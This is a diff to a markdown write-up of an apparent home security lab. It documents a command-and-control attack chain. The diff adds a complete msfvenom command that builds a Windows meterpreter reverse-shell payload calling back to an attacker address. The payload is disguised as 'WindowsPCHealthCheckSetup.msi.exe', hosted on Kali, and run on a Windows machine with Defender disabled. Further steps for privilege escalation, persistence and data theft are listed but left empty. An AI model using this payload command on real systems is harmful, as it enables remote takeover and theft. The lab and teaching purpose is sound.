@@ -160,16 +160,24 @@
 
 ### 4.1.Full Attack Chain: Command and Control (C2)
 
-* Creating a malware uisng msfvenom ``.
+* Creating a malware uisng msfvenom `sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.251.3 LPORT=4444 --platform windows -a x64 -f exe -o WindowsPCHealthCheckSetup.msi.exe`.
 
-* Hosted it on `/var/www/html/WinUpdatex64` in kali.
+* Hosted it on `/var/www/html/WindowsPCHealthCheckSetup.msi.exe` in kali.
 
-* * _Windows defender real time protection is turned off for this lab demonstration._
+* _Windows defender real time protection is turned off for this lab demonstration._
 
-* Downloading the malware from `http://192.168.251.3/WinUpdatex64` and running it on windows to make the remote connecion for command and control.
+* Downloading the malware from `http://192.168.251.3/WindowsPCHealthCheckSetup.msi.exe` and running it on windows to make the remote connecion for command and control.
 
 * Meterpreter session opened in multi/handler.
 
-### 4.2.Post-Exploitation Analysis: Detecting C2 Persistence and Lateral Movement
+* **Executing Privilege Escalation:** ``
+
+* Deleting/Moving the malware deep inside the system ``
+
+* **Setting Persistence:** ``
+
+* Stealing/Damaging the data.
+
+### 4.2.Post-Exploitation Analysis: Privilege Escalation and Detecting C2 Persistence
 
 
